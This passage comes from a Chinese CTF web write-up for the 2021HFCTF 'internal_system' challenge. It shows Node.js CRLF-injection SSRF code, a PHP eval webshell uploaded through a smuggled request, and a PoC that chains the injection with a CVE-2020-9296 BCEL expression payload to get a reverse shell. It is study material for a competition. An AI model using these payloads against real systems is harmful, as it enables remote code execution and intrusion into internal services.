eval($_POST[&quot;whoami&quot;]);?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Upload</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_encode</span>(<span class="params">raw</span>):</span></span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ</span></span><br></pre></td></tr></table></figure>

<p>构造请求：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>返回包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"><span class="built_in">test</span>: HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>



<p>在SSRF中我们经常使用 Gopher 协议去攻击内网应用，比如Redis、MySQL、FTP等。但是当 Gopher 协议被过滤了之后，我们还可以通过HTTP协议并配合CRLF漏洞进行攻击，达到与 Gopher 协议一样的效果。</p>
<p>至此，完成了 nodejs CRLF 注入复现</p>
<h3 id="再次回到题目中"><a href="#再次回到题目中" class="headerlink" title="再次回到题目中"></a>再次回到题目中</h3><p>现在我们可以通过 题目的 <code>GET</code> 代理发送 <code>POST</code>请求（假如题目中的 node 版本是 &lt; 9），现在尝试利用漏洞，看看是否能利用成功。</p>
<p>构造 POC，node 或 F12 控制运行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// netflix 的内网 IP 地址</span><br><span class="line">netflix_host = <span class="string">&quot;10.0.49.14&quot;</span></span><br><span class="line">// 在复现 CVE-<span class="number">2020</span>-<span class="number">9296</span> 时生成的 BCEL 编码</span><br><span class="line">bcel_evil = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">// 以下不用改</span><br><span class="line">post_payload = <span class="string">&#x27;[\u&#123;017b&#125;\u&#123;0122&#125;name\u&#123;0122&#125;:\u&#123;0122&#125;$\u&#123;017b&#125;\u&#123;0127&#125;1\u&#123;0127&#125;.getClass().forName(\u&#123;0127&#125;com.sun.org.apache.bcel.internal.util.ClassLoader\u&#123;0127&#125;).newInstance().loadClass(\u&#123;0127&#125;&#x27;</span> +  bcel_evil + <span class="string">&#x27;\u&#123;0127&#125;).newInstance().class\u&#123;017d&#125;\u&#123;0122&#125;,\u&#123;0122&#125;ownerEmail\u&#123;0122&#125;:\u&#123;0122&#125;test@example.org\u&#123;0122&#125;,\u&#123;0122&#125;retryCount\u&#123;0122&#125;:\u&#123;0122&#125;3\u&#123;0122&#125;,\u&#123;0122&#125;timeoutSeconds\u&#123;0122&#125;:\u&#123;0122&#125;1200\u&#123;0122&#125;,\u&#123;0122&#125;inputKeys\u&#123;0122&#125;:[\u&#123;0122&#125;sourceRequestId\u&#123;0122&#125;,\u&#123;0122&#125;qcElementType\u&#123;0122&#125;],\u&#123;0122&#125;outputKeys\u&#123;0122&#125;:[\u&#123;0122&#125;state\u&#123;0122&#125;,\u&#123;0122&#125;skipped\u&#123;0122&#125;,\u&#123;0122&#125;result\u&#123;0122&#125;],\u&#123;0122&#125;timeoutPolicy\u&#123;0122&#125;:\u&#123;0122&#125;TIME_OUT_WF\u&#123;0122&#125;,\u&#123;0122&#125;retryLogic\u&#123;0122&#125;:\u&#123;0122&#125;FIXED\u&#123;0122&#125;,\u&#123;0122&#125;retryDelaySeconds\u&#123;0122&#125;:\u&#123;0122&#125;600\u&#123;0122&#125;,\u&#123;0122&#125;responseTimeoutSeconds\u&#123;0122&#125;:\u&#123;0122&#125;3600\u&#123;0122&#125;,\u&#123;0122&#125;concurrentExecLimit\u&#123;0122&#125;:\u&#123;0122&#125;100\u&#123;0122&#125;,\u&#123;0122&#125;rateLimitFrequencyInSeconds\u&#123;0122&#125;:\u&#123;0122&#125;60\u&#123;0122&#125;,\u&#123;0122&#125;rateLimitPerFrequency\u&#123;0122&#125;:\u&#123;0122&#125;50\u&#123;0122&#125;,\u&#123;0122&#125;isolationgroupId\u&#123;0122&#125;:\u&#123;0122&#125;myIsolationGroupId\u&#123;0122&#125;\u&#123;017d&#125;]&#x27;</span></span><br><span class="line"></span><br><span class="line">encode_post_payload = encodeURI(<span class="string">&#x27;http://0.0.0.0:3000/\u&#123;0120&#125;HTTP/1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;POST\u&#123;0120&#125;/search?url=http://&#x27;</span> + netflix_host + <span class="string">&#x27;:8080/api/metadata/taskdefs\u&#123;0120&#125;HTTP/1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;Content-Type:application/json\u&#123;010D&#125;\u&#123;010A&#125;Content-Length:&#x27;</span> + post_payload.length + <span class="string">&#x27;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;&#x27;</span> + post_payload+ <span class="string">&#x27;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;GET\u&#123;0120&#125;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;GET /proxy?url=&quot;</span> + encode_post_payload + <span class="string">&quot; HTTP/1.1&quot;</span></span><br><span class="line"></span><br><span class="line">console.log(poc)</span><br></pre></td></tr></table></figure>

<p>这里的 encodeURI 编码 1 次是防止传输过程中特殊字符被干掉 。</p>
<p><code>console.log(poc)</code> 输出的东西替换 HTTP 包第一行即可。</p>
<p><img src="/img/2021hfctf/image-20210424120721588.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210424120721588.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424120721588"></p>
<p>成功反弹</p>
<p><img src="/img/2021hfctf/image-20210424000231228.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210424000231228.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424000231228"></p>
<p>这个题目流程有点多，做个小总结</p>
<ul>
<li>nodejs 数组绕过管理员登录</li>
<li> <code>isPublic</code> 绕过，通过 /proxy 获取 /flag 得到提示</li>
<li>通过 docker 默认网段，或者题目给的提示 fuzz 内网网段的8080端口</li>
<li>构造 CVE-2020-9296 Netflix  Post POC 反弹 shell </li>
<li>利用 nodejs &lt; 9 进行 CRLF注入，发送 CVE-2020-9296 Netflix  Post POC </li>
<li>最终通过 cat /flag 获取 flag</li>
</ul>

  
  
    
    <div class='footer'>
      
      
      
        <div class='copyright'>
          <blockquote>
            
              
                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>

              
            
              
                <p>本文永久链接是：<a href=https://tari.moe/p/2021/2021hfctf/>https://tari.moe/p/2021/2021hfctf/</a></p>
              
            
          </blockquote>
        </div>
      
      
    </div>
  
  
    


  <div class='article-meta' id="bottom">
    <div class='new-meta-box'>
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf%E6%AF%94%E8%B5%9B/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf比赛</p></a></div>


        
      
    </div>
  </div>


  
  

  
    <div class="prev-next">
      
        <a class='prev' href='/p/2021/thread-modeling/'>
          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>威胁建模安全基础知识</p>
          <p class='content'>实习过程中零零碎碎学了一些，但还没系统学过，发现微软有个挺全面的，打算系统学习一波~
https://docs.microsoft.com/zh-cn/learn/paths/tm-threat...</p>
        </a>
      
      
        <a class='next' href='/p/2021/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/'>
          <p class='title'>Wireshark入门与实战<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
          <p class='content'>

wireshark入门: https://www.bilibili.com/video/BV1X5411x7R4他这里顺序有点误，应该是 P1-P26，P32-P39，P27-P31
Wir...</p>
        </a>
      
    </div>
  
</article>


  

  <article class="post white-box reveal shadow" id="comments">
    <p ct><i class='fas fa-comments'></i> 评论</p>
    
    <div id="gitalk-container"></div>

  </article>






</div>
<aside class='l_side'>
  
  
    
    



  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
    
  <header>
    
      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>文档目录</span>
    
  </header>


    <div class='content'>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsetme"><span class="toc-text">unsetme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9C%E6%85%A2%E6%85%A2%E5%81%9A%E2%80%9D-%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-text">“慢慢做” 管理系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#internal-system"><span class="toc-text">internal_system</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-9296-%E5%A4%8D%E7%8E%B0"><span class="toc-text">CVE-2020-9296 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%80%E4%B8%AA%EF%BC%8C%E7%86%9F%E6%82%89%E4%B8%80%E4%B8%8BBCEL"><span class="toc-text">自己写一个，熟悉一下BCEL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E7%94%A8%E7%8E%B0%E6%9C%89%E5%B7%A5%E5%85%B7"><span class="toc-text">直接用现有工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0POC"><span class="toc-text">构造POC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE%E4%B8%AD"><span class="toc-text">回到题目中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs-lt-9%E7%89%88%E6%9C%AC-CRLF%E6%B3%A8%E5%85%A5"><span class="toc-text">nodejs &lt; 9版本 CRLF注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE%E4%B8%AD"><span class="toc-text">再次回到题目中</span></a></li></ol></li></ol>
    </div>
  </section>


  


</aside>



		  
		  <!--此文件用来存放一些不方便取值的变量-->
<!--思路大概是将值藏到重加载的区域内-->

<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.postTitle="2021HFCTF Web Writeup";
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  // header 这里无论是否开启pjax都需要
  var l_header=document.getElementById("l_header");
  
  l_header.classList.add("show");
  
  
    // cover
    var cover_wrapper=document.querySelector('.cover-wrapper');
    
    cover_wrapper.id="none";
    cover_wrapper.style.display="none";
    
  
</script>

        </div>
        
  
  <footer class="footer clearfix">
    <br><br>
    
      
        本站使用
        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
        作为主题
      
    
      
        
          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
</div>
        
      
    
      
        
          <div><p>本站托管于 <a target="_blank" rel="noopener" href="https://pages.github.com/">Github Page</a> &amp;&amp; CDN 使用 <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">JSDELIVR</a></p>
</div>
        
      
    
      
        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
</div>
      
    
      
        <div class='copyright'>
        <p><a href="/">Copyright © 2019-2022 TARI TARI</a></p>

        </div>
      
    
  </footer>


        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
      </div>
    </div>
    <div>
      <script>
/************这个文件存放不需要重载的全局变量和全局函数*********/
window.volantis={};
window.volantis.loadcss=document.getElementById("loadcss");
/******************** Pjax ********************************/
function VPjax(){
	this.list=[] // 存放回调函数
	this.start=()=>{
	  for(var i=0;i<this.list.length;i++){
		this.list[i].run();
	  }
	}
	this.push=(fn,name)=>{
		var f=new PjaxItem(fn,name);
		this.list.push(f);
	}
	// 构造一个可以run的对象
	function PjaxItem(fn,name){
		// 函数名称
		this.name = name || fn.name
		// run方法
		this.run=()=>{
			fn()
		}
	}
}
volantis.pjax={}
volantis.pjax.method={
	complete: new VPjax(),
	error: new VPjax(),
	send: new VPjax()
}
volantis.pjax={
	...volantis.pjax,
	push: volantis.pjax.method.complete.push,
	error: volantis.pjax.method.error.push,
	send: volantis.pjax.method.send.push
}
/********************脚本懒加载函数********************************/
// 已经加入了setTimeout
function loadScript(src, cb) {
	setTimeout(function() {
		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
		var script = document.createElement('script');
		script.setAttribute('type','text/javascript');
		if (cb) script.onload = cb;
		script.setAttribute('src', src);
		HEAD.appendChild(script);
	});
}
//https://github.com/filamentgroup/loadCSS
var loadCSS = function( href, before, media, attributes ){
	var doc = window.document;
	var ss = doc.createElement( "link" );
	var ref;
	if( before ){
		ref = before;
	}
	else {
		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
		ref = refs[ refs.length - 1];
	}
	var sheets = doc.styleSheets;
	if( attributes ){
		for( var attributeName in attributes ){
			if( attributes.hasOwnProperty( attributeName ) ){
				ss.setAttribute( attributeName, attributes[attributeName] );
			}
		}
	}
	ss.rel = "stylesheet";
	ss.href = href;
	ss.media = "only x";
	function ready( cb ){
		if( doc.body ){
			return cb();
		}
		setTimeout(function(){
			ready( cb );
		});
	}
	ready( function(){
		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
	});
	var onloadcssdefined = function( cb ){
		var resolvedHref = ss.href;
		var i = sheets.length;
		while( i-- ){
			if( sheets[ i ].href === resolvedHref ){
				return cb();
			}
		}
		setTimeout(function() {
			onloadcssdefined( cb );
		});
	};
	function loadCB(){
		if( ss.addEventListener ){
			ss.removeEventListener( "load", loadCB );
		}
		ss.media = media || "all";
	}
	if( ss.addEventListener ){
		ss.addEventListener( "load", loadCB);
	}
	ss.onloadcssdefined = onloadcssdefined;
	onloadcssdefined( loadCB );
	return ss;
};
</script>
<script>
  
  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
  
  
  
  
</script>
<!-- required -->

<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>

<script>
  function pjax_fancybox() {
    $(".md .gallery").find("img").each(function () { //渲染 fancybox
      var element = document.createElement("a"); // a 标签
      $(element).attr("class", "fancybox");
      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
      $(element).attr("href", $(this).attr("src"));
      if ($(this).attr("data-original")) {
        $(element).attr("href", $(this).attr("data-original"));
      }
      $(element).attr("data-fancybox", "images");
      var caption = "";   // 描述信息
      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
        $(element).attr('data-caption', $(this).attr('alt'));
        caption = $(this).attr('alt');
      }
      var div = document.createElement("div");
      $(div).addClass("fancybox");
      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
      var span = document.createElement("span");
      $(span).addClass("image-caption");
      $(span).text(caption); // 加描述
      $(this).after(span);  // 再套一层描述
      $(this).wrap(element);  // 最后套 a 标签
    })
    $(".md .gallery").find("img").fancybox({
      selector: '[data-fancybox="images"]',
      hash: false,
      loop: false,
      closeClick: true,
      helpers: {
        overlay: {closeClick: true}
      },
      buttons: [
        "zoom",
        "close"
      ]
    });
  };
  function SCload_fancybox() {
    if ($(".md .gallery").find("img").length == 0) return;
    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
  };
  $(function () {
    SCload_fancybox();
  });
  function Pjax_SCload_fancybox(){
	if (typeof $.fancybox == "undefined") {
	 SCload_fancybox();
    } else {
	 pjax_fancybox();
    }
  }
  volantis.pjax.push(Pjax_SCload_fancybox)
  volantis.pjax.send(()=>{
      if (typeof $.fancybox != "undefined") {
        $.fancybox.close();    // 关闭弹窗
      }
  },'fancybox')
</script>


<!-- internal -->




<script>
  function loadIssuesJS() {
    if ($(".md").find(".issues-api").length == 0) return;
	
	  loadScript('/js/issues.js');
	
  };
  $(function () {
    loadIssuesJS();
  });
  volantis.pjax.push(()=>{
	if (typeof IssuesAPI == "undefined") {
	  loadIssuesJS();
	}
  },"IssuesJS")
</script>



  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
